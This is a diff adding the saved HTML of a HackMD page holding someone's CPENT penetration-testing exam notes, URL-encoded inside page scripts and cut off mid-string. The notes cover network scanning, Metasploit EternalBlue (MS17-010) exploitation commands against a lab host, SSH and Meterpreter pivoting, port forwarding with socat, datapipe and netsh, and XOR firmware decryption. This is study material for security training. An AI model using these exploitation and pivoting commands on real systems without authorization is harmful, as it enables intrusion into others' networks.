@@ -1,0 +1,1069 @@
+<!DOCTYPE html>
+<html lang="dev" data-themeable="true" theme="dark">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="csrf-token" content="UKqGznda-CE-G0-lBx5r7jK5X0sZ64zg55J8">
+    
+    
+    <meta name="description" content="2024-04-18 10_54_50-CPENT - PowerPoint2024-04-18 10_55_00-CPENT - PowerPoint2024-04-18 10_55_14-CPENT - PowerPoint2024-04-18 10_55_27-CPENT - PowerPoint2024-04-18 10_55_40-CPENT - PowerPoint2024-04-18 10_55_52-CPENT - PowerPoint2024-04-18 10_56_03-CPENT - PowerPoint2024-04-18 10_56_16-CPENT - PowerPoint">
+    
+    <title>CPENT考試筆記(Vincent) - HackMD</title>
+    <link rel="icon" type="image/png" href="https://hackmd.io/favicon.png">
+	<link rel="apple-touch-icon" href="https://hackmd.io/apple-touch-icon.png">
+	<!--  meta value for server side given sign in boolean -->
+    <meta name="signin" content="false">
+
+    <script nonce="1a6ddcbb-b7a3-4739-a7c1-9d97222cdbb1">
+  (() => {
+    const resolveTheme = (preferredTheme) => {
+      if (preferredTheme) return preferredTheme
+      if (
+        typeof window.matchMedia === 'function' &&
+        window.matchMedia('(prefers-color-scheme: dark)').matches
+      ) {
+        return 'dark'
+      }
+      return 'light'
+    }
+
+    const isPrint = new URL(window.location.href).searchParams.get('print') === 'true'
+    const uiTheme = resolveTheme('dark' || null)
+    const contentTheme = isPrint ? 'light' : resolveTheme('' || null)
+
+    window.__HMD_IS_PRINT_MODE__ = isPrint
+    document.documentElement.setAttribute('theme', uiTheme)
+    window.__HMD_INITIAL_UI_THEME__ = uiTheme
+    window.__HMD_INITIAL_CONTENT_THEME__ = contentTheme
+  })()
+</script>
+
+    
+<script nonce="1a6ddcbb-b7a3-4739-a7c1-9d97222cdbb1">
+  window.domain = 'hackmd.io'
+  window.urlpath = ''
+  window.debug = false || window.localStorage.getItem('HMD_DEBUG_FLAG') === 'true'
+  window.version = '1.3.0'
+  window.brand = 'HackMD'
+
+  
+  window.NOTE_ID = '1vYYi43vTm-3jD0R_bL00Q'
+  
+
+  
+  window.PUBLISH_TYPE = 'view'
+  
+
+  window.GOOGLE_DRIVE_API_KEY = 'AIzaSyAHmcP5gL_64ZafuAYOvJruFAIaYgHQaY4'
+  window.GOOGLE_DRIVE_CLIENT_ID = '65857506266-76uhhee8se8dgs1i0q8fhtj1prg0ar27.apps.googleusercontent.com'
+  window.DROPBOX_APP_KEY = 'rdoizrlnkuha23r'
+  
+  window.PLANTUML_SERVER = 'https://ptuml.hackmd.io'
+
+  window.ASSET_URL = 'https://assets.hackmd.io'
+
+  window.USER_CAN_CREATE_TEAM = true
+  window.USER_CAN_DELETE_ACCOUNT = true
+  window.USER_DELETE_ACCOUNT_VIA_EMAIL = true
+  window.PAYMENT_ENABLED = true
+  window.PAYMENT_PROMOTION_BANNER_ENABLED = false
+  window.GITHUB_SYNC_ENABLED = true
+  window.GITLAB_SYNC_ENABLED = false
+  window.GITLAB_SYNC_BASE_URL = ''
+  window.VCS_SYNC_MODE = 'github'
+  window.VCS_PROVIDER_NAME = 'GitHub'
+  window.FREE_TEAM_NUM = 20
+  window.FREE_TEAM_MEMBER_NUM = 3
+  window.FREE_PUBLIC_TEAM_NUM = 10
+  window.FOLDER_ENABLE = true
+
+  
+  window.EE_SITE_ENABLE = false
+  window.EE_SITE_NAME = 'false'
+  window.EE_SITE_LINK = 'false'
+  window.EESITE_INFO = false
+  window.ENTERPRISE_DISCOVERY_ENABLE = false
+  window.ENTERPRISE_DISCOVERY_TEAM = true
+  window.ENTERPRISE_DISCOVERY_NOTE = true
+  window.ENTERPRISE_DISCOVERY_VIEW_PERMISSION = 'guest'
+  
+  window.ALLOW_ANONYMOUS = true
+  window.ALLOW_ANONYMOUS_EDIT = false
+  window.ALLOW_DOWNLOAD_PDF = true
+  window.PUBLIC_OVERVIEW = false
+  window.INTERNAL_PUBLIC_OVERVIEW = false
+  window.FULL_TEXT_SEARCH_ENABLE = false
+  window.ALGOLIA_SEARCH_ENABLE = true
+  window.MARKETING_EMAIL_ENABLE = true
+  window.EMAIL_INVITATION_ENABLE = true
+  
+  
+  
+    window.WALLET_CONNECT_PROJECT_ID = '91d6fa182b725b5895a17a170a5878c1'
+  
+  window.API_MANAGEMENT_UI_ENABLE = true
+  window.FEEDBACK_UI_ENABLE = true
+  window.PUBLISH_ENABLE = true
+
+  
+
+  
+  window.SHOW_OVERVIEW = false
+  
+
+  
+  window.MENTIONS = {}
+  
+
+  
+  window.MENTION_ANCHORS = []
+  
+
+  
+  window.COMMENT_ANCHORS = []
+  
+
+  
+  window.IS_OWNER = false
+  
+
+  
+  window.IS_TEAM_ADMIN = false
+  
+
+  
+  window.IS_TEAM_MEMBER = false
+  
+
+  
+  window.IS_INVITEE_ADMIN = false
+  
+
+  
+  window.USER_PROFILE = '%7B%22name%22%3A%22Guest%20Campbell%22%7D'
+  
+
+  
+  window.VERSION_TIME = '1713430783427'
+  
+
+  
+  window.canEdit = false
+  
+
+  
+  window.canWriteComment = false
+  
+
+  
+  window.canHideComment = false
+  
+
+  window.TRASH_NOTE_DELETE_AFTER_FREE = 3
+  window.TRASH_NOTE_DELETE_AFTER_PAID = 30
+
+  
+    window.ENABLED_PREVIEW_FEATURE = {}
+  
+
+  
+    window.ACTIVE_PREVIEW_FEATURE = ["beta-slide-preview","beta-note-insights","beta-neo-book"]
+  
+
+  
+
+  
+
+  
+    window.IS_OWNER_UPGRADED = false
+  
+
+  
+    window.IMGUR_FALLBACK_CDN = 'https://imgur-backup.hackmd.io'
+  
+
+  
+    window.YAML_METADATA_ENABLED = false
+  
+
+  
+    window.NOTE_CAPACITY_LIMIT = 50
+  
+
+  
+    window.DOCUMENT_MAX_LENGTH = 100000
+  
+
+  
+    window.SOCIAL_NETWORK_FEATURES_ENABLED = true
+  
+
+  
+    window.PUBLISHMENT_MODERATION_ENABLED = true
+  
+
+  
+    window.COMMENT_ENABLED = true
+  
+
+  
+    window.COMMENT_PERMISSION = "signed_in_users"
+  
+
+  window.SUGGEST_EDIT_ENABLED = true
+  
+    window.SUGGEST_EDIT_ENABLED = true
+  
+
+  
+    window.SUGGEST_EDIT_PERMISSION = "signed_in_users"
+  
+  
+    window.canWriteSuggestEdit = false
+  
+
+  window.CITATION_ENABLED = true
+
+  window.NOTE_FROM_COMMENT_ENABLED = true
+
+  
+    window.NOTE_FEATURES = {"emoji-reply":"signed_in_users","citation":"disabled"}
+  
+
+  
+    window.REALTIME_CLIENT_WITH_CREDENTIALS = false
+  
+
+  
+
+  
+    window.PREFERRED_UI_THEME = "dark"
+  
+
+  
+
+  
+    window.CUSTOM_STYLE_ENABLED = "true"
+  
+
+  
+
+  
+    window.ITERABLE_ENABLED = false
+  
+  
+    window.ITERABLE_API_KEY = "c2c36a44c2614fb19aa3b46d660bbce2"
+  
+
+  
+    window.CUSTOMERIO_ENABLED = true
+  
+  
+    window.CUSTOMERIO_WRITE_KEY = "90283c80a6498bb8d1ee"
+  
+  
+    window.CUSTOMERIO_SITE_ID = "9947d0d46b7ece25dea7"
+  
+
+  
+    window.TEXT_SELECTION_CHANGED = false
+  
+
+  
+    window.CAN_VIEW_HISTORY_AT_REVISION = false
+  
+
+  
+    window.GUIDED_COMMENT_ENABLED = true
+  
+
+  
+    window.ENCODED_SESSION_ID = "4lLl9/+tv61xW/ayhI2N8/6Fp6xtkisdDl8ftPrwZ88="
+  
+
+  
+    window.COMMUNITY_ENABLED = true
+  
+
+  
+    window.NOTE_INSIGHTS_DEBUG_API_ENABLED = false
+  
+
+  
+
+  
+</script>
+
+
+    
+<!-- Google Tag Manager -->
+<script nonce="1a6ddcbb-b7a3-4739-a7c1-9d97222cdbb1">(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-KLW9Z3');</script>
+<!-- End Google Tag Manager -->
+
+
+    
+
+
+
+
+
+
+    <meta property="fb:app_id" content="1436904003272070">
+
+
+
+    <meta name="robots" content="index, follow">
+
+
+
+
+    <meta name="twitter:image:src" content="https://hackmd.io/api/_/preview/1vYYi43vTm-3jD0R_bL00Q">
+    <meta name="twitter:image:alt" content="CPENT考試筆記(Vincent) - HackMD">
+
+
+<meta name="twitter:site" content="@hackmdio" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="CPENT考試筆記(Vincent) - HackMD" />
+
+
+    <meta name="twitter:description" content="2024-04-18 10_54_50-CPENT - PowerPoint2024-04-18 10_55_00-CPENT - PowerPoint2024-04-18 10_55_14-CPENT - PowerPoint2024-04-18 10_55_27-CPENT - PowerPoint2024-04-18 10_55_40-CPENT - PowerPoint2024-04-18 10_55_52-CPENT - PowerPoint2024-04-18 10_56_03-CPENT - PowerPoint2024-04-18 10_56_16-CPENT - PowerPoint" />
+
+
+
+    <meta property="og:image" content="https://hackmd.io/api/_/preview/1vYYi43vTm-3jD0R_bL00Q">
+    <meta property="og:image:alt" content="CPENT考試筆記(Vincent) - HackMD">
+
+
+<meta property="og:site_name" content="HackMD" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="CPENT考試筆記(Vincent) - HackMD" />
+
+
+    <meta property="og:description" content="2024-04-18 10_54_50-CPENT - PowerPoint2024-04-18 10_55_00-CPENT - PowerPoint2024-04-18 10_55_14-CPENT - PowerPoint2024-04-18 10_55_27-CPENT - PowerPoint2024-04-18 10_55_40-CPENT - PowerPoint2024-04-18 10_55_52-CPENT - PowerPoint2024-04-18 10_56_03-CPENT - PowerPoint2024-04-18 10_56_16-CPENT - PowerPoint" />
+
+
+
+    <link rel="canonical" href="https://hackmd.io/@6AhJdzpGTyGDlAxru4jZbA/r1fLYbAx0" />
+    <meta property="og:url" content="https://hackmd.io/@6AhJdzpGTyGDlAxru4jZbA/r1fLYbAx0" />
+    <meta property="twitter:url" content="https://hackmd.io/@6AhJdzpGTyGDlAxru4jZbA/r1fLYbAx0" />
+
+    <link rel="alternate" type="text/markdown" href="https://hackmd.io/@6AhJdzpGTyGDlAxru4jZbA/r1fLYbAx0.md" title="Pure markdown version">
+    <link rel="alternate" type="text/markdown" href="https://hackmd.io/@6AhJdzpGTyGDlAxru4jZbA/r1fLYbAx0.md?no-meta" title="Pure markdown version without metadata">
+
+
+<!-- article meta -->
+
+
+
+
+
+<!-- profile meta -->
+
+
+
+     <link href="https://assets.hackmd.io/build/font-vendor.ea8218d7d4f468b2c430.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/common-vendor.fd34b1d1ad1390fa8864.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/pretty-vendor.8a8442e30c89d342d615.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/pretty.0ce5b1257beb6eb700e7.css" rel="stylesheet">
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+<!--[if lt IE 9]>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js" integrity="sha256-3Jy/GbSLrg0o9y5Z5n1uw0qxZECH7C6OQpVBgNFYa0g=" crossorigin="anonymous"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.min.js" integrity="sha256-g6iAfvZp+nDQ2TdTR/VVKJf3bGro4ub5fvWSWVRi2NE=" crossorigin="anonymous"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/es5-shim/4.5.9/es5-shim.min.js" integrity="sha256-8E4Is26QH0bD52WoQpcB+R/tcWQtpzlCojrybUd7Mxo=" crossorigin="anonymous"></script>
+<![endif]-->
+
+    
+
+
+    <script nonce="1a6ddcbb-b7a3-4739-a7c1-9d97222cdbb1">
+  window.__shouldIgnoreTracker = function() {
+    const isDebug = window.debug === true
+    const isLocal = /^localhost$|^127(\.[0-9]+){0,2}\.[0-9]+$|^\[::1?\]$|^local\.localhost$/.test(location.hostname) || location.protocol === 'file:'
+    const isAutomation = Boolean(window._phantom || window.__nightmare || window.navigator.webdriver || window.Cypress)
+    return isDebug || isLocal || isAutomation
+  }
+</script>
+
+<!-- plausible -->
+<script defer data-domain="hackmd.io" src="https://tracks.hackmd.io/js/script.js"></script>
+<script nonce="1a6ddcbb-b7a3-4739-a7c1-9d97222cdbb1">
+  window.plausible = window.plausible || function() { (window.plausible.q = window.plausible.q || []).push(arguments); }
+  const keyboardWhiteList = ['a', 'span', 'button']
+
+  function getTaggedEventAttributes (e) {
+    const eventAttrs = { name: null, props: {} }
+    if (!e || !e.classList) return eventAttrs
+    const psEvent = /plausible-event-(.+)(=|--)(.+)/
+    for (const className of [...e.classList]) {
+      const [, key, , val] = className.match(psEvent) || []
+      if (!key || !val) continue
+      const value = val.replace(/\+/g, ' ')
+      switch (key.toLowerCase()) {
+        case 'name':
+          eventAttrs.name = value
+          break
+        default:
+          eventAttrs.props[key] = value
+          break
+      }
+    }
+    return eventAttrs
+  }
+
+  function shouldIgnore () {
+    return window.__shouldIgnoreTracker() || window.localStorage.getItem('plausible_ignore') === 'true'
+  }
+
+  function handler (e) {
+    if (!window.plausible) return
+    if (!e.target || !('className' in e.target)) return
+    const ele = e.target
+
+    const eventAttrs = getTaggedEventAttributes(ele)
+    if (!eventAttrs.name) return
+    if (ele?.href) eventAttrs.props.url = ele.href
+
+    if (shouldIgnore()) {
+      if (window.debug) logDebugEventMsg(eventAttrs)
+      return
+    }
+    window.plausible(eventAttrs.name, { props: eventAttrs.props })
+  }
+
+  function logDebugEventMsg (eventAttrs) {
+    console.warn(
+      `Ignoring Event: "${eventAttrs.name}"`,
+      eventAttrs,
+    )
+  }
+
+  function keydownHandler (e) {
+    if (e.key !== 'Enter') return
+    if (e.target.nodeName.toLowerCase() === 'input') {
+      switch (e.target.type.toLowerCase()) {
+        case 'submit':
+        case 'button':
+        case 'reset':
+        case 'checkbox':
+        case 'radio':
+        case 'file':
+        case 'image':
+        case 'color':
+          break
+        default:
+          return
+      }
+    } else if (!keyboardWhiteList.includes(e.target.nodeName.toLowerCase())) {
+      return
+    }
+    handler(e)
+  }
+
+  document.addEventListener('mousedown', handler)
+  document.addEventListener('keydown', keydownHandler)
+</script>
+
+    
+<script nonce="1a6ddcbb-b7a3-4739-a7c1-9d97222cdbb1">
+  window.publishProps = JSON.parse(`{"isOwnerAnonymous":false,"isOwnedByTeam":false,"ownerInfo":{"name":"techbeck","path":"6AhJdzpGTyGDlAxru4jZbA","avatarUrl":"https%3A%2F%2Fuploads-public.hackmd.io%2FnxSlZKb.jpg","description":null},"isPublished":true,"createTime":1713408329866,"updateTime":1713430783427,"vcsSyncMode":"github","vcsProviderName":"GitHub","canEdit":false,"hardBreaks":true,"onlyOwnerCanEdit":true,"isCommentEnabled":true,"likedCount":2,"isNotificationEnabled":true,"notificationType":"never","hasEmail":false,"canWriteComment":false,"viewCount":1986,"markdown":"---%0Atags%3A%20%E5%B7%A5%E4%BD%9C%E7%94%A8%2C%20Pentest%2C%20%E6%BB%B2%E9%80%8F%E6%B8%AC%E8%A9%A6%2C%20CPENT%0A---%0A%0A%23%20CPENT%E8%80%83%E8%A9%A6%E7%AD%86%E8%A8%98(Vincent)%0A%0A%23%23%20SCAN%0A%0A!%5B2024-04-18%2010_54_50-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2Fry0JnbCg0.png)%0A%0A%60%60%60bash%3D%0A%24%20sudo%20nmap%20-n%20-sn%20-PS22%2C80%2C445%2C3389%20192.168.0.1-254%20-oG%20ip_scan.txt%0A%24%20grep%20Up%20ip_scan.txt%20%7C%20cut%20-d%22%22%20-f2%0A%60%60%60%0A%0A!%5B2024-04-18%2010_55_00-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2Fry0khW0lA.png)%0A%0A!%5B2024-04-18%2010_55_14-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FryAJ3ZRe0.png)%0A%0A%0A%0A!%5B2024-04-18%2010_55_27-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FrkC13-RxA.png)%0A%0A%60%60%60bash%3D%0Afor%20i%20in%20%7B1..254%7D%3B%20do%20(ping%20-c%20192.168.0.%24i%20%7C%20grep%20%22bytes%20from%22%20%26)%3B%20done%0A%60%60%60%0A%0A!%5B2024-04-18%2010_55_40-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2Frk01hZAeA.png)%0A%0A%60%60%60bash%3D%0A%24sudo%20nmap%20-p%201-1024%0A%24sudo%20nmap%20-p%201024-%0A%24sudo%20nmap%20-p%20-1024%0A%24sudo%20nmap%20-p%20-%0A%0A%24sudo%20nmap%20-n%20scanme.nmap.org%20-p22%2C25%2C80%2C135%20--reason%0A%60%60%60%0A%0A!%5B2024-04-18%2010_55_52-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2Frk0J2WAlA.png)%0A%0A%60%60%60bash%3D%0A%24sudo%20dpkg%20-i%20rustscan_2.0.1_amd64.deb%0A%24rustscan%20-u%205000%20-t%207000%20-a%20192.168.0.7%0A%24rustscan%20-u%205000%20-t%207000%20--script%20none%20-a%20192.168.0.7%0A%24rustscan%20-u%205000%20-t%207000%20-a%20192.168.0.7%20--%20-Pn%20-sVC%20-oA%207_host%0A%60%60%60%0A%0A%23%23%23%20Exploit%20MS17_010%0A!%5B2024-04-18%2010_56_03-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FS10y2ZAlR.png)%0A%60%60%60bash%3D%0A%24msfconsole%0A%0A%3Esearch%20ms17_010%0A%3Euse%20exploit%2Fwindows%2Fsmb%2Fms17_010_eternalblue%0A%3Eshow%20options%0A%3Eset%20rhosts%20192.168.0.7%0A%3Echeck%0A%3Eexploit%0A%60%60%60%0A%0A!%5B2024-04-18%2010_56_16-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FSJAJnW0xR.png)%0A%0A%0A%0A%23%23%20ENUMERATION%0A%0A!%5B2024-04-18%2011_08_16-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FSyLgkMAxA.png)%0A!%5B2024-04-18%2011_08_25-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FrJ8eyMReR.png)%0A!%5B2024-04-18%2011_08_33-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2Fr1IeJz0lC.png)%0A!%5B2024-04-18%2011_08_41-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2Fr1UlJGRxR.png)%0A!%5B2024-04-18%2011_08_48-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FSJUlkG0eA.png)%0A!%5B2024-04-18%2011_08_57-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FSk8l1MCxA.png)%0A!%5B2024-04-18%2011_09_03-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FSkLgJzAeA.png)%0A!%5B2024-04-18%2011_09_15-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FBJUgyzAxR.png)%0A%0A%0A%0A%23%23%20Privilege%20Escalation%0A%0A!%5B2024-04-18%2011_24_19-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2Fr16ufz0x0.png)%0A%0A%0A%23%23%20Egress%20Busting%0A%0A!%5B2024-04-18%2011_24_44-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FSkznfzAl0.png)%0A!%5B2024-04-18%2011_25_03-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FrJz2fzAg0.png)%0A%0A%0A%23%23%20Persistent%0A%0A!%5B2024-04-18%2011_25_34-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FBkspGMCgA.png)%0A%0A%0A%23%23%20POST%0A%0A!%5B2024-04-18%2011_26_00-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FBy71QfRxR.png)%0A%0A%0A%23%23%20OT%0A%0A!%5B2024-04-18%2011_26_27-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FrJNzmMAeR.png)%0A%0A!%5B2024-04-18%2011_26_42-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2Fr14zmG0gR.png)%0A%0A%0A%23%23%20Pivoting%20%26%20Double%20Pivoting%20%E8%B7%B3%E5%8F%B0%20%26%20%E9%9B%99%E8%B7%B3%E5%8F%B0%0A%0A!%5B2024-04-18%2011_27_24-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FSkxjAXfClA.png)%0A%0A!%5B2024-04-18%2011_27_34-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FBkoRQMClR.png)%0A%0A!%5B2024-04-18%2011_27_50-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FBJjCQM0eR.png)%0A%0A!%5B2024-04-18%2011_28_02-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FrkjR7MRl0.png)%0A%0A%60%60%60bash%3D%0A%24ssh%20-L%3A%2080%3A192.168.0.24%3A80%20administrator%20%40192.168.0.70%0A%60%60%60%0A%0A!%5B2024-04-18%2011_28_13-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FSyo0XfCxC.png)%0A%0A%60%60%60bash%3D%0A%24ssh%20-R%20*%3A8008%3A192.168.0.24%3A80%20administrator%40192.168.0.70%0A%0A%24sudo%20nano%20%2Fetc%2Fssh%2Fsshd_config%0A%E2%86%92GatewayPorts%20yes%0A%24sudo%20service%20ssh%20restart%0A%0A%60%60%60%0A%0A!%5B2024-04-18%2011_28_33-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FBksCmz0lR.png)%0A%0A%60%60%60bash%3D%0A%24ssh%20-D%209050%20administrator%40192.168.0.70%0A%24sudo%20nano%20%2Fetc%2Fproxychains.conf%0A%60%60%60%0A%0A!%5B2024-04-18%2011_28_46-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FS1jC7zRxA.png)%0A%0A%60%60%60bash%3D%0A%24ssh%20-J%20administrator%40192.168.0.70%20administrator%40192.168.0.10%20-L%20*%3A8888%3A192.168.0.24%3A80%0A%60%60%60%0A%0A!%5B2024-04-18%2011_28_58-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FSJoRmMCg0.png)%0A%0A%60%60%60bash%3D%0A%23%20MSF%0A%3EUse%20exploit%2Fmulti%2Fssh%2Fsshexec%0A%3Eset%20rhosts%3C%3E%0A%3Eset%20username%3C%3E%0A%3Eset%20password%20%3C%3E%0A%3Eexploit%0A%0A%23%23%20Meterpreter%20(Session-Routing)%0A%3Erun%20post%2Fmulti%2Fmanage%2Fautoroute%20OPTION%3Ds%0A%3Erun%20autoroute%20-p%0A%3Ebackground%0A%0A%60%60%60%0A%0A!%5B2024-04-18%2011_29_12-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FBJoA7fCeA.png)%0A%0A%60%60%60bash%3D%0Ahttps%3A%2F%2Fgithub.com%2Fbovine%2Fdatapine%2Fblob%2Fmaster%2Fdatapipe.c%0A%23%20change%20Line%2080%3A%2020%20-%3E%20999%0A%24gcc%20datapine.c%20-o%20datapine%0A%0Adatapipe%200.0.0.0%20135%20%3CWIN%3E%20135%0Adatapipe%200.0.0.0%20445%20%3CWIN%3E%20445%0Adatapipe%200.0.0.0%204444%20%3CPARROT%3E%204444%0A%60%60%60%0A%0A!%5B2024-04-18%2011_29_25-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FrksC7G0eA.png)%0A%0A%60%60%60bash%3D%0A%23Socat%20(full%20function%2C%20fat%2C%20support%20UDP)%0Asocat%20tcp-listen%3A80%2Cfork%20tcp%3A%3CIP%3E%3A80%0Asocat%20udp-recvfrom%3A161%2Cfork%20udp-sendto%3A%3CIP%3E%3A161%0Asocat%20udp-recvfrom%3A53%2Cfork%20udp-sendto%3A%3CIP%3E%3A53%0Asocat%20udp-recvfrom%3A123%2Cfork%20udp-sendto%3A%3CIP%3E%3A123%0A%0A%23Portproxy(Windows%20netsh%20built-in)%0Anetsh%20interface%20portproxy%20add%20v4tov4%2080%20%3CIP%3E%2080%0Anetsh%20interface%20portproxy%20show%20v4tov4%0Anetsh%20interface%20portproxy%20delete%20v4tov4%2080%20%3CIP%3E%2080%0A%60%60%60%0A%0A!%5B2024-04-18%2011_29_39-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FHJsR7zCeR.png)%0A%0A!%5B2024-04-18%2011_29_54-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FB1sCmz0gR.png)%0A%0A%0A%0A%23%23%20IOT%0A%0A!%5B2024-04-18%2011_30_47-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FS1RmNMRlC.png)%0A!%5B2024-04-18%2011_31_00-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FS1CmVzAeA.png)%0A!%5B2024-04-18%2011_31_12-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FSyRmNfReA.png)%0A%0A%60%60%60bash%3D%0A%24binwalk%20-t%20encrypted.bin%0A%24hexdump%20-v%20-C%20encrypted.bin%0A%24binwalk%20-E%20encrypted.bin%0A%24hexdump%20-v%20-C%20encrypted.bin%20%7C%20cut%20-d%22%20%22%20-f3-20%20%7C%20sort%20%7C%20uniq%20-c%20%7C%20sort%20-nr%20%7C%20head%20-n%2020%0A%24chmod%20%2Bx%20xcat.py%0A%24.%2Fxcat.py%20-x%20%3Cxor_key%3E%20encrypted.bin%20%3E%20decrypted.bin%0A%24binwalk%20-t%20decrypted.bin%0A%60%60%60%0A%0A!%5B2024-04-18%2011_31_26-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FByAm4GAlC.png)%0A%0A%60%60%60bash%3D%0A%24python3%20-m%20pip3%20install%20xortool%0A%24xortool%20enctypted.bin%0A%24xortool%20enctypted.bin%20-l%208%20-c%2000%0A%24binwalk%20-t%20-e%20xortool_out%2F0.out%0A%24cat%20xortool_out%2Ffilename-key.csv%0A%24python%20-c%20%22print(b'%5Cx88D%5Cxa2%5Cxd1h%5Cxb4Z-'.hex())%22%0A%60%60%60%0A%0A%23%23%20BINARY%0A%0A!%5B2024-04-18%2011_31_58-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FByElHGRg0.png)%0A%0A!%5B2024-04-18%2011_32_14-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FHy4lSMAxR.png)%0A%0A-%20https%3A%2F%2Fdocs.microsoft.com%2Fen-us%2Farchive%2Fmsdn-magazine%2F2002%2Ffebruary%2Finside-windows-win32-portable-executable-file-format-in-detail%0A-%20https%3A%2F%2Fdocs.microsoft.com%2Fen-us%2Farchive%2Fmsdn-magazine%2F2002%2Fmarch%2Finside-windows-an-in-depth-look-into-the-win32-portable-executable-file-format-part-2%0A-%20https%3A%2F%2Ftech-zealots.com%2Fmalware-analysis%2Fpe-portable-executable-structure-malware-analysis-part-2%2F%0A-%20http%3A%2F%2Fblog.dkbza.org%2F2012%2F08%2Fpe-file-format-graphs.html%0A%0A%0A!%5B2024-04-18%2011_32_29-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FS1EerfAl0.png)%0A%0A%0A!%5B2024-04-18%2011_32_40-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FrJVgHzCx0.png)%0A%0A-%20https%3A%2F%2Fweb.archive.org%2Fweb%2F20171130164537%2Fhttp%3A%2F%2Fnairobi-embedded.org%2F004_elf_format.html%0A-%20https%3A%2F%2Fweb.archive.org%2Fweb%2F20171129031316%2Fhttp%3A%2F%2Fnairobi-embedded.org%2F040_elf_sec_seg_vma_mappings.html%0A%0A!%5B2024-04-18%2011_32_54-CPENT%20-%20PowerPoint%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FHkQxSz0eR.png)%0A%0A%60%60%60bash%3D%0A%24strings%20.%2Fcrackme0x00a%20%7C%20grep%20GLIBC%0A%24objdump%20-d%20%2Fbin%2Fbash%0A%24objdump%20-d%20-M%20intel%20%2Fbin%2Fbash%0A%0Ause%20gdb%20to%20look%20at%20the%20registers%0